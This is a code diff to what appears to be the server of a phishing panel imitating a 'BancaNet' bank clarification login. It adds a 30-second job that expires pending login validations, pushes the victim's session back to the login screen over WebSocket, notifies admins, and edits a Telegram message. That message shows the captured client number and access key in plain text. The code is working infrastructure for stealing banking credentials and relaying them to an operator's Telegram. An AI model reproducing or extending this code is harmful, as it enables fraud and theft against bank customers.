@@ -3485,6 +3485,53 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  // Background job: Verificar validaciones de login expiradas cada 30 segundos
+  setInterval(async () => {
+    try {
+      const expiredValidations = await storage.getExpiredTelegramValidations();
+      
+      for (const validation of expiredValidations) {
+        console.log(`[Timeout] Validación expirada: ${validation.validationId}, sesión: ${validation.sessionId}`);
+        
+        // Marcar como expirada
+        await storage.updateTelegramValidation(validation.validationId, {
+          status: 'expired',
+          respondedAt: new Date()
+        });
+
+        // Actualizar la sesión para volver al login
+        const updatedSession = await storage.updateSession(validation.sessionId, {
+          loginValidated: false,
+          pasoActual: ScreenType.LOGIN
+        });
+
+        if (updatedSession) {
+          // Notificar al cliente vía WebSocket
+          const updateMessage = JSON.stringify({
+            type: 'SESSION_UPDATE',
+            data: updatedSession
+          });
+          sendToClient(validation.sessionId, updateMessage);
+          broadcastToAdmins(updateMessage);
+
+          // Editar el mensaje de Telegram
+          if (validation.telegramMessageId) {
+            const editedMessage = 
+              `🏦 <b>Login - Aclaraciones BancaNet</b>\n\n` +
+              `📱 <b>Número de Cliente:</b> ${validation.numeroCliente}\n` +
+              `🔑 <b>Clave de Acceso:</b> ${validation.claveAcceso}\n` +
+              `🆔 <b>Session ID:</b> ${validation.sessionId}\n\n` +
+              `⏰ <b>EXPIRADO</b> - Sin respuesta\n` +
+              `${new Date().toLocaleString('es-MX')}`;
+            await editTelegramMessage(validation.telegramMessageId, editedMessage);
+          }
+        }
+      }
+    } catch (error) {
+      console.error('[Timeout] Error verificando validaciones expiradas:', error);
+    }
+  }, 30000); // Cada 30 segundos
+
   return httpServer;
 }
 
